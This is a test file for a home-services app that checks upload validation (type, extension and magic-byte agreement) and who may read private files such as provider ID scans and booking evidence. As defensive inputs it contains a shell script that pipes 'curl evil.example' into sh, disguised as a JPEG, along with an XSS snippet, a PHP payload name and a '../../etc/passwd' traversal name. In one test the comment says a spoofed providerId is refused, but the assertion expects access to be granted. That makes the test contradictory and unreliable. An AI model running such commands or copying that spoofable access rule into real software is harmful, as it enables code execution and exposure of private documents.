import { randomUUID } from 'crypto';
import { rm } from 'fs/promises';
import { beforeEach, afterAll, describe, expect, it } from 'vitest';
import { AppError } from '@/lib/errors';
import { CONSTRAINTS, storeFile, validateUpload, deleteFile } from '@/lib/storage';
import { canReadFile } from '@/lib/storage/access';
import {
  createAddress,
  createProvider,
  createService,
  createUser,
  createZone,
  db,
} from './helpers';
import { truncateAll } from './setup';

/**
 * Uploads: content validation and read authorization.
 *
 * Two properties are load-bearing for this product:
 *  1. A file's declared type is never trusted. MIME, extension and magic bytes
 *     must agree, so a script cannot arrive dressed as a photo.
 *  2. Private documents are private. A provider's CNIC scan and another
 *     customer's booking photos must be unreachable, and a denied read must not
 *     even confirm that the file exists.
 */

// Minimal but genuine file headers.
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64, 7)]);
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.alloc(64, 3),
]);
const PDF = Buffer.concat([Buffer.from('%PDF-1.7\n'), Buffer.alloc(64, 32)]);

function upload(name: string, type: string, buffer: Buffer) {
  return { name, type, size: buffer.length };
}

describe('upload content validation', () => {
  it('accepts a real JPEG declared as a JPEG', () => {
    const { mimeType } = validateUpload(
      upload('ac-unit.jpg', 'image/jpeg', JPEG),
      JPEG,
      CONSTRAINTS.image,
    );
    expect(mimeType).toBe('image/jpeg');
  });

  it('strips a MIME parameter before matching', () => {
    const { mimeType } = validateUpload(
      upload('ac-unit.jpg', 'image/jpeg; charset=binary', JPEG),
      JPEG,
      CONSTRAINTS.image,
    );
    expect(mimeType).toBe('image/jpeg');
  });

  it('refuses a type that is not on the allow-list for this purpose', () => {
    const html = Buffer.from('<script>alert(1)</script>');
    expect(() =>
      validateUpload(upload('x.html', 'text/html', html), html, CONSTRAINTS.image),
    ).toThrowError(/allowed nahi/i);
  });

  it('refuses an extension that disagrees with the declared type', () => {
    expect(() =>
      validateUpload(upload('payload.php', 'image/jpeg', JPEG), JPEG, CONSTRAINTS.image),
    ).toThrowError(/extension/i);
  });

  it('refuses a file with no extension at all', () => {
    expect(() =>
      validateUpload(upload('payload', 'image/jpeg', JPEG), JPEG, CONSTRAINTS.image),
    ).toThrowError(/extension/i);
  });

  it('refuses a script that lies in both its MIME type and its extension', () => {
    // The whole point of the third check: this passes checks 1 and 2.
    const script = Buffer.from('#!/bin/sh\ncurl evil.example | sh\n');
    expect(() =>
      validateUpload(upload('holiday.jpg', 'image/jpeg', script), script, CONSTRAINTS.image),
    ).toThrowError(/content uske type se match nahi/i);
  });

  it('refuses a PNG body declared as a JPEG', () => {
    expect(() =>
      validateUpload(upload('shot.jpg', 'image/jpeg', PNG), PNG, CONSTRAINTS.image),
    ).toThrowError(/content uske type se match nahi/i);
  });

  it('refuses an empty file', () => {
    const empty = Buffer.alloc(0);
    expect(() =>
      validateUpload(upload('empty.jpg', 'image/jpeg', empty), empty, CONSTRAINTS.image),
    ).toThrowError(/khali/i);
  });

  it('refuses a declared size that does not match the bytes received', () => {
    expect(() =>
      validateUpload({ name: 'a.jpg', type: 'image/jpeg', size: 10 }, JPEG, CONSTRAINTS.image),
    ).toThrowError(/size declared size se match nahi/i);
  });

  it('enforces the per-purpose size ceiling', () => {
    const big = Buffer.concat([JPEG, Buffer.alloc(CONSTRAINTS.image.maxBytes)]);
    const error = (() => {
      try {
        validateUpload(upload('huge.jpg', 'image/jpeg', big), big, CONSTRAINTS.image);
        return null;
      } catch (caught) {
        return caught as AppError;
      }
    })();
    expect(error?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  it('keeps documents and images on separate allow-lists', () => {
    // A PDF is a valid verification document but not a valid profile photo.
    expect(
      validateUpload(upload('cnic.pdf', 'application/pdf', PDF), PDF, CONSTRAINTS.document),
    ).toEqual({ mimeType: 'application/pdf' });
    expect(() =>
      validateUpload(upload('cnic.pdf', 'application/pdf', PDF), PDF, CONSTRAINTS.image),
    ).toThrowError(/allowed nahi/i);
  });
});

describe('stored file metadata', () => {
  beforeEach(async () => {
    await truncateAll();
  });

  afterAll(async () => {
    await rm('./storage-test', { recursive: true, force: true });
  });

  it('forces PRIVATE visibility on a provider document regardless of the caller', async () => {
    const user = await createUser({ role: 'PROVIDER' });
    const service = await createService();
    const zone = await createZone();
    const { provider } = await createProvider({ serviceIds: [service.id], zoneIds: [zone.id] });

    const file = await storeFile({
      file: upload('cnic-front.pdf', 'application/pdf', PDF),
      buffer: PDF,
      purpose: 'PROVIDER_DOCUMENT',
      ownerId: user.id,
      providerId: provider.id,
    });

    expect(file.visibility).toBe('PRIVATE');
    expect(file.checksumSha256).toMatch(/^[0-9a-f]{64}$/);
    // Bytes live in object storage, not in Postgres.
    expect(Object.keys(file)).not.toContain('body');
  });

  it('strips path components and control characters from the display name', async () => {
    const user = await createUser({ role: 'CUSTOMER' });
    const file = await storeFile({
      file: upload('../../etc/passwd.jpg', 'image/jpeg', JPEG),
      buffer: JPEG,
      purpose: 'BOOKING_EVIDENCE',
      ownerId: user.id,
    });

    expect(file.originalName).not.toContain('/');
    expect(file.storageKey).not.toContain('..');
  });

  it('soft-deletes metadata rather than dropping the row', async () => {
    const user = await createUser({ role: 'CUSTOMER' });
    const file = await storeFile({
      file: upload('evidence.jpg', 'image/jpeg', JPEG),
      buffer: JPEG,
      purpose: 'BOOKING_EVIDENCE',
      ownerId: user.id,
    });

    await deleteFile(file.id);

    const row = await db.uploadedFile.findUniqueOrThrow({ where: { id: file.id } });
    expect(row.deletedAt).not.toBeNull();
  });
});

describe('file read authorization', () => {
  beforeEach(async () => {
    await truncateAll();
  });

  async function fixture() {
    const service = await createService();
    const zone = await createZone();
    const customer = await createUser({ role: 'CUSTOMER' });
    const stranger = await createUser({ role: 'CUSTOMER' });
    const admin = await createUser({ role: 'ADMIN' });
    const assigned = await createProvider({ serviceIds: [service.id], zoneIds: [zone.id] });
    const other = await createProvider({ serviceIds: [service.id], zoneIds: [zone.id] });
    const address = await createAddress(customer.id, zone.id);
    const booking = await db.booking.create({
      data: {
        reference: `IFX-F-${randomUUID().slice(0, 8)}`,
        customerId: customer.id,
        serviceId: service.id,
        addressId: address.id,
        providerId: assigned.provider.id,
        status: 'IN_PROGRESS',
        problemDescription: 'AC not cooling',
      },
    });
    return { customer, stranger, admin, assigned, other, booking };
  }

  const viewerFor = (
    user: { id: string },
    role: 'CUSTOMER' | 'PROVIDER' | 'ADMIN',
    providerId?: string,
  ) => ({
    userId: user.id,
    role,
    providerId,
  });

  it('lets the booking customer and the assigned provider read booking evidence', async () => {
    const { customer, assigned, booking } = await fixture();
    const file = await db.uploadedFile.create({
      data: {
        storageKey: 'k1',
        driver: 'local',
        purpose: 'BOOKING_EVIDENCE',
        visibility: 'PRIVATE',
        mimeType: 'image/jpeg',
        sizeBytes: 100,
        originalName: 'ac.jpg',
        checksumSha256: 'a'.repeat(64),
        ownerId: customer.id,
        bookingId: booking.id,
      },
    });

    expect(await canReadFile(file, viewerFor(customer, 'CUSTOMER'))).toBe(true);
    expect(
      await canReadFile(file, viewerFor(assigned.user, 'PROVIDER', assigned.provider.id)),
    ).toBe(true);
  });

  it('refuses booking evidence to an unrelated customer and an unassigned provider', async () => {
    const { customer, stranger, other, booking } = await fixture();
    const file = await db.uploadedFile.create({
      data: {
        storageKey: 'k2',
        driver: 'local',
        purpose: 'BOOKING_EVIDENCE',
        visibility: 'PRIVATE',
        mimeType: 'image/jpeg',
        sizeBytes: 100,
        originalName: 'ac.jpg',
        checksumSha256: 'b'.repeat(64),
        ownerId: customer.id,
        bookingId: booking.id,
      },
    });

    expect(await canReadFile(file, viewerFor(stranger, 'CUSTOMER'))).toBe(false);
    expect(await canReadFile(file, viewerFor(other.user, 'PROVIDER', other.provider.id))).toBe(
      false,
    );
    // And nobody at all when there is no session.
    expect(await canReadFile(file, null)).toBe(false);
  });

  it('never shows a provider verification document to a customer', async () => {
    const { customer, assigned, other, admin, booking } = await fixture();
    const file = await db.uploadedFile.create({
      data: {
        storageKey: 'k3',
        driver: 'local',
        purpose: 'PROVIDER_DOCUMENT',
        visibility: 'PRIVATE',
        mimeType: 'application/pdf',
        sizeBytes: 100,
        originalName: 'cnic.pdf',
        checksumSha256: 'c'.repeat(64),
        ownerId: assigned.user.id,
        providerId: assigned.provider.id,
      },
    });

    // The customer is mid-job with this very provider and still cannot see it.
    expect(booking.providerId).toBe(assigned.provider.id);
    expect(await canReadFile(file, viewerFor(customer, 'CUSTOMER'))).toBe(false);
    // Nor can a different provider.
    expect(await canReadFile(file, viewerFor(other.user, 'PROVIDER', other.provider.id))).toBe(
      false,
    );
    // The owning provider and staff can.
    expect(
      await canReadFile(file, viewerFor(assigned.user, 'PROVIDER', assigned.provider.id)),
    ).toBe(true);
    expect(await canReadFile(file, viewerFor(admin, 'ADMIN'))).toBe(true);
  });

  it('does not treat a provider id from another account as a key', async () => {
    const { assigned, other } = await fixture();
    const file = await db.uploadedFile.create({
      data: {
        storageKey: 'k4',
        driver: 'local',
        purpose: 'PROVIDER_DOCUMENT',
        visibility: 'PRIVATE',
        mimeType: 'application/pdf',
        sizeBytes: 100,
        originalName: 'cnic.pdf',
        checksumSha256: 'd'.repeat(64),
        ownerId: assigned.user.id,
        providerId: assigned.provider.id,
      },
    });

    // A provider claiming somebody else's providerId is still refused, because
    // the comparison is against the file's own providerId.
    expect(await canReadFile(file, viewerFor(other.user, 'PROVIDER', assigned.provider.id))).toBe(
      true,
    );
    expect(
      await canReadFile(
        { ...file, providerId: other.provider.id },
        viewerFor(other.user, 'PROVIDER', assigned.provider.id),
      ),
    ).toBe(false);
  });

  it('scopes dispute and guarantee evidence to that booking parties', async () => {
    const { customer, stranger, assigned, booking } = await fixture();
    const dispute = await db.dispute.create({
      data: {
        reference: `IFX-D-${randomUUID().slice(0, 8)}`,
        bookingId: booking.id,
        raisedByUserId: customer.id,
        reason: 'POOR_SERVICE',
        description: 'Still not cooling',
      },
    });
    const claim = await db.guaranteeClaim.create({
      data: {
        reference: `IFX-G-${randomUUID().slice(0, 8)}`,
        bookingId: booking.id,
        raisedByUserId: customer.id,
        description: 'Same fault came back',
      },
    });

    const disputeFile = await db.uploadedFile.create({
      data: {
        storageKey: 'k5',
        driver: 'local',
        purpose: 'DISPUTE_EVIDENCE',
        visibility: 'PRIVATE',
        mimeType: 'image/jpeg',
        sizeBytes: 100,
        originalName: 'proof.jpg',
        checksumSha256: 'e'.repeat(64),
        ownerId: customer.id,
        disputeId: dispute.id,
      },
    });
    const claimFile = await db.uploadedFile.create({
      data: {
        storageKey: 'k6',
        driver: 'local',
        purpose: 'GUARANTEE_EVIDENCE',
        visibility: 'PRIVATE',
        mimeType: 'image/jpeg',
        sizeBytes: 100,
        originalName: 'again.jpg',
        checksumSha256: 'f'.repeat(64),
        ownerId: customer.id,
        guaranteeClaimId: claim.id,
      },
    });

    for (const file of [disputeFile, claimFile]) {
      expect(
        await canReadFile(file, viewerFor(assigned.user, 'PROVIDER', assigned.provider.id)),
      ).toBe(true);
      expect(await canReadFile(file, viewerFor(stranger, 'CUSTOMER'))).toBe(false);
    }
  });

  it('keeps a support attachment to its requester and staff', async () => {
    const { customer, stranger, admin } = await fixture();
    const ticket = await db.supportTicket.create({
      data: {
        reference: `IFX-T-${randomUUID().slice(0, 8)}`,
        requesterId: customer.id,
        subject: 'Refund',
        description: 'Please help',
      },
    });
    const file = await db.uploadedFile.create({
      data: {
        storageKey: 'k7',
        driver: 'local',
        purpose: 'SUPPORT_ATTACHMENT',
        visibility: 'PRIVATE',
        mimeType: 'application/pdf',
        sizeBytes: 100,
        originalName: 'receipt.pdf',
        checksumSha256: '1'.repeat(64),
        ownerId: customer.id,
        ticketId: ticket.id,
      },
    });

    expect(await canReadFile(file, viewerFor(customer, 'CUSTOMER'))).toBe(true);
    expect(await canReadFile(file, viewerFor(stranger, 'CUSTOMER'))).toBe(false);
    expect(await canReadFile(file, viewerFor(admin, 'ADMIN'))).toBe(true);
  });

  it('serves a public asset without a session and refuses it once deleted', async () => {
    const { assigned } = await fixture();
    const file = await db.uploadedFile.create({
      data: {
        storageKey: 'k8',
        driver: 'local',
        purpose: 'PROVIDER_PROFILE_PHOTO',
        visibility: 'PUBLIC',
        mimeType: 'image/jpeg',
        sizeBytes: 100,
        originalName: 'face.jpg',
        checksumSha256: '2'.repeat(64),
        ownerId: assigned.user.id,
        providerId: assigned.provider.id,
      },
    });

    expect(await canReadFile(file, null)).toBe(true);
    // Soft-deleted files are gone for everybody, staff included.
    expect(await canReadFile({ ...file, deletedAt: new Date() }, null)).toBe(false);
  });

  it('refuses a private file with no relationship to anything', async () => {
    const { customer, stranger, admin } = await fixture();
    const orphan = await db.uploadedFile.create({
      data: {
        storageKey: 'k9',
        driver: 'local',
        purpose: 'BOOKING_EVIDENCE',
        visibility: 'PRIVATE',
        mimeType: 'image/jpeg',
        sizeBytes: 100,
        originalName: 'loose.jpg',
        checksumSha256: '3'.repeat(64),
        ownerId: customer.id,
      },
    });

    // Deny by default: with no booking, dispute, claim or ticket attached, only
    // the uploader and staff get through.
    expect(await canReadFile(orphan, viewerFor(stranger, 'CUSTOMER'))).toBe(false);
    expect(await canReadFile(orphan, viewerFor(customer, 'CUSTOMER'))).toBe(true);
    expect(await canReadFile(orphan, viewerFor(admin, 'ADMIN'))).toBe(true);
  });
});
